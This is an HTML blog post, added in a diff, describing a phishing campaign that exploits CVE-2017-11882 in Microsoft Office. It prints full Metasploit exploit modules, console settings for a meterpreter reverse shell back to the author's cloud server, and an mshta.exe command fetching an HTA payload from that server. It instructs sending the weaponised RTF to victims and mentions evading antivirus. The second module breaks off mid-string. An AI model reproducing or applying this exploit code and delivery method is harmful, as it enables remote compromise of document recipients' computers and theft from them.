@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="倾旋的博客" property="og:site_name">
+
+  <meta content="CVE-2017-11882钓鱼攻击" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="本文概述一次钓鱼攻击" property="og:description">
+
+
+  <meta content="http://localhost:4000/archivers/2017-11-22/1" property="og:url">
+
+
+  <meta content="2017-11-22T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="CVE漏洞利用" property="article:section">
+  
+
+
+  
+
+  <title>CVE-2017-11882钓鱼攻击</title>
+  <meta name="description" content="本文概述一次钓鱼攻击">
+<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
+  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2017-11-22/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">倾旋的博客</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/about/">关于我</a></li>
+
+        
+
+        
+        
+        <li><a href="/category/">Category</a></li>
+
+        
+
+        
+        
+        <li><a href="/contact/">Contact</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/other/">其他信息</a></li>
+
+        
+
+        
+        
+        <li><a href="/tools/socat">socat 使用手册</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">CVE-2017-11882钓鱼攻击</h1>
+      <p class="post-meta"><time datetime="2017-11-22T00:00:00+08:00" itemprop="datePublished">Nov 22, 2017</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>本文概述一次钓鱼攻击
+<!--more--></p>
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>此次攻击使用了小组师傅改写的CVE利用脚本，能够将内容自定义，大大增加了小鱼上钩的可能。</p>
+
+<h2 id="0x01-环境简介">0x01 环境简介</h2>
+
+<ul>
+  <li>阿里云ECS服务器（Ubuntu） - <code class="highlighter-rouge">118.**.**.77</code></li>
+  <li>CVE-2017-11882.py 用于包装rtf</li>
+  <li>msf &amp;&amp; CVE-2017-11882.rb</li>
+</ul>
+
+<p>CVE-2017-11882.rb内容如下：</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##</span>
+<span class="c1"># This module requires Metasploit: https://metasploit.com/download</span>
+<span class="c1"># Current source: https://github.com/rapid7/metasploit-framework</span>
+<span class="c1">##</span>
+
+
+<span class="k">class</span> <span class="nc">MetasploitModule</span>  <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+  <span class="no">Rank</span> <span class="o">=</span> <span class="no">NormalRanking</span>
+
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpServer</span>
+
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span>  <span class="o">=</span> <span class="p">{})</span>
+    <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+      <span class="s1">'Name'</span> <span class="o">=&gt;</span> <span class="s1">'Microsoft Office Payload Delivery'</span><span class="p">,</span>
+      <span class="s1">'Description'</span> <span class="o">=&gt;</span> <span class="sx">%q{
+        This module generates an command to place within
+        a word document, that when executed, will retrieve a HTA payload
+        via HTTP from an web server. Currently have not figured out how
+        to generate a doc.
+      }</span><span class="p">,</span>
+      <span class="s1">'License'</span> <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+      <span class="s1">'Arch'</span> <span class="o">=&gt;</span> <span class="no">ARCH_X86</span><span class="p">,</span>
+      <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
+      <span class="s1">'Targets'</span> <span class="o">=&gt;</span>
+        <span class="p">[</span>
+          <span class="p">[</span><span class="s1">'Automatic'</span><span class="p">,</span> <span class="p">{}</span> <span class="p">],</span>
+        <span class="p">],</span>
+      <span class="s1">'DefaultTarget'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">))</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">on_request_uri</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">_request</span><span class="p">)</span>
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">"Delivering payload"</span><span class="p">)</span>
+    <span class="nb">p</span> <span class="o">=</span> <span class="n">regenerate_payload</span><span class="p">(</span><span class="n">cli</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Util</span><span class="o">::</span><span class="no">EXE</span><span class="p">.</span><span class="nf">to_executable_fmt</span><span class="p">(</span>
+      <span class="n">framework</span><span class="p">,</span>
+      <span class="no">ARCH_X86</span><span class="p">,</span>
+      <span class="s1">'win'</span><span class="p">,</span>
+      <span class="nb">p</span><span class="p">.</span><span class="nf">encoded</span><span class="p">,</span>
+      <span class="s1">'hta-psh'</span><span class="p">,</span>
+      <span class="p">{</span> <span class="ss">:arch</span> <span class="o">=&gt;</span> <span class="no">ARCH_X86</span><span class="p">,</span> <span class="ss">:platform</span> <span class="o">=&gt;</span> <span class="s1">'win '</span><span class="p">}</span>
+    <span class="p">)</span>
+    <span class="n">send_response</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="s1">'Content-Type'</span> <span class="o">=&gt;</span> <span class="s1">'application/hta'</span><span class="p">)</span>
+  <span class="k">end</span>
+
+
+  <span class="k">def</span> <span class="nf">primer</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">get_uri</span>
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">"Place the following DDE in an MS document:"</span><span class="p">)</span>
+    <span class="n">print_line</span><span class="p">(</span><span class="s2">"mshta.exe </span><span class="se">\"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="se">\"</span><span class="s2">"</span><span class="p">)</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h2 id="0x02-配置环境">0x02 配置环境</h2>
+
+<p>首先我要将<code class="highlighter-rouge">阿里云安全组</code>配置一下，预留两个端口：</p>
+
+<ul>
+  <li>7878 用于HTA WebServer</li>
+  <li>4455 用于接收客户端Shell</li>
+</ul>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x04.png" alt="0x04" /></p>
+
+<p>接着，将<code class="highlighter-rouge">CVE-2017-11882.rb</code>放入metasploit-framework中的exploits目录里，然后打开msfconsole，<code class="highlighter-rouge">reload_all</code></p>
+
+<p>这块不啰嗦</p>
+
+<p>找一份简单的资料文本，新建一个RTF文件：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x00.png" alt="0x00" /></p>
+
+<p>找好之后，在里面可以写上你想写的内容 :) 诱惑~ 哈哈</p>
+
+<p>下一步就要设置msf模块的配置了：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(CVE-2017-11882) &gt; show options 
+
+Module options (exploit/windows/CVE-2017-11882):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  7788             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH  1.hta            no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     118.**.**.77   yes       The listen address
+   LPORT     4455             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+</code></pre></div></div>
+
+<p>由于阿里云ECS服务器上没有对我的网卡直接分配外网IP，所以需要LHOST监听外网IP地址，SERVHOST用于目标机器访问加载HTA，填写0.0.0.0即可，这样现在就可以与安全组配置相符了。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(CVE-2017-11882) &gt; exploit 
+[*] Exploit running as background job 13.
+
+[-] Handler failed to bind to 118.**.**.77:4455:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4455 
+[*] Using URL: http://0.0.0.0:7788/1.hta
+msf exploit(CVE-2017-11882) &gt; [*] Local IP: http://172.**.**.191:7788/1.hta
+[*] Server started.
+[*] Place the following DDE in an MS document:
+mshta.exe "http://118.**.**.77:7788/1.hta"
+</code></pre></div></div>
+
+<p>执行<code class="highlighter-rouge">exploit</code>的时候它会提示无法bind外网IP，这属于正常现象，bind不上外网就会bind 0.0.0.0，所以没关系，我们的目的就是把外网IP地址写入HTA~</p>
+
+<h2 id="0x03-生成钓鱼rtf文档">0x03 生成钓鱼RTF文档</h2>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x01.png" alt="0x01" /></p>
+
+<p>此时将exp.rtf发送给对方即可。</p>
+
+<h2 id="0x04-利用结果">0x04 利用结果</h2>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x02.png" alt="0x02" /></p>
+
+<p>受害者这边：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x03.png" alt="0x03" /></p>
+
+<h2 id="0x05-关于免杀---mshtaexe">0x05 关于免杀 - mshta.exe</h2>
+
+<p>mshta被用的太多了，并且很容易被拦截</p>
+
+<p>可以结合:http://payloads.online/archivers/2017-11-08/1 弄出新姿势</p>
+
+<p>MSF官方给出了新的rb：</p>
+
+<p>https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##</span>
+<span class="c1"># This module requires Metasploit: https://metasploit.com/download</span>
+<span class="c1"># Current source: https://github.com/rapid7/metasploit-framework</span>
+<span class="c1">##</span>
+
+<span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+  <span class="no">Rank</span> <span class="o">=</span> <span class="no">ManualRanking</span>
+
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpServer</span>
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Powershell</span>
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">EXE</span>
+
+
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+    <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+      <span class="s1">'Name'</span> <span class="o">=&gt;</span> <span class="s1">'Microsoft Office CVE-2017-11882'</span><span class="p">,</span>
+      <span class="s1">'Description'</span> <span class="o">=&gt;</span> <span class="sx">%q{
+        Module exploits a flaw in the Equation Editor, developed
+        in 2000, that allowed any OLE object to execute in a separate
+        address space. Compared to original PoC, allows for a command within
+        a length of 109 bytes to be executed Affects Microsoft Office word for the latest
+        17 years.
+      }</span><span class="p">,</span>
+      <span class="s1">'Author'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'mumbai'</span><span class="p">,</span> <span class="s1">'embedi'</span><span class="p">,</span> <span class="s1">'BlackMathIT'</span><span class="p">],</span>
+      <span class="s1">'License'</span> <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+      <span class="s1">'DisclosureDate'</span> <span class="o">=&gt;</span> <span class="s1">'Nov 15 2017'</span><span class="p">,</span>
+      <span class="s1">'References'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+        <span class="p">[</span><span class="s1">'URL'</span><span class="p">,</span> <span class="s1">'https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about'</span><span class="p">],</span>
+        <span class="p">[</span><span class="s1">'URL'</span><span class="p">,</span> <span class="s1">'https://github.com/embedi/CVE-2017-11882'</span><span class="p">],</span>
+        <span class="p">[</span><span class="s1">'URL'</span><span class="p">,</span> <span class="s1">'https://github.com/BlackMathIT/2017-11882_Generator/blob/master/2017-11882_Generator.py'</span><span class="p">]</span>
+      <span class="p">],</span>
+      <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
+      <span class="s1">'Arch'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="no">ARCH_X86</span><span class="p">,</span> <span class="no">ARCH_X64</span><span class="p">],</span>
+      <span class="s1">'Targets'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+        <span class="p">[</span><span class="s1">'Automatic'</span><span class="p">,</span> <span class="p">{}</span> <span class="p">],</span>
+      <span class="p">],</span>
+      <span class="s1">'DefaultTarget'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="s1">'Payload'</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="s1">'DisableNops'</span> <span class="o">=&gt;</span> <span class="kp">true</span>
+      <span class="p">},</span>
+      <span class="s1">'DefaultOptions'</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="s1">'EXITFUNC'</span> <span class="o">=&gt;</span> <span class="s1">'thread'</span><span class="p">,</span>
+        <span class="s1">'PAYLOAD'</span> <span class="o">=&gt;</span> <span class="s1">'windows/x64/meterpreter/reverse_tcp'</span>
+      <span class="p">}</span>
+    <span class="p">))</span>
+
+    <span class="n">register_options</span><span class="p">([</span>
+        <span class="no">OptString</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"FILENAME"</span><span class="p">,</span> <span class="p">[</span><span class="kp">true</span><span class="p">,</span> <span class="s2">"Filename to save as"</span><span class="p">])</span>
+    <span class="p">])</span>
+  <span class="k">end</span>
+
+
+
+  <span class="k">def</span> <span class="nf">generate_rtf</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="s1">'{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}'</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'{\*\generator Riched20 6.3.9600}\viewkind4\uc1'</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'\pard\sa200\sl276\slmult1\f0\fs22\lang9{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata '</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e007400720079000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'00000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020ce'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'a5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'000000000000001400000000000000010043006f006d0070004f0062006a0000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'0001000000660000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'00000000000000000000000012000201ffffffff04000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000003'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'ffffff0100000208000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'00000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c00000044532045'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s1">'71756174696f6e000b0000004571756174696f6e2e3300f439b2710000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">header</span> <span class="o">&lt;&lt;</span> <span class="s2">"00000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><span class="se">\n</span><span class="s2">"</span>
+
+    <span class="n">footer</span> <span class="o">=</span> <span class="s1">'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'4500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000400'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000C50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'00000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C0000000000050000000902000000000500000002'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE00000000000090'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'01000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A60019016'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A00000031313131313131'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'3131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB02100007000000'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'0000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F00100'</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'00030000000000'</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'}{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260'</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"0100090000039e00000002001c0000000000050000000902000000000500000002010100000005</span><span class="se">\n</span><span class="s2">"</span>
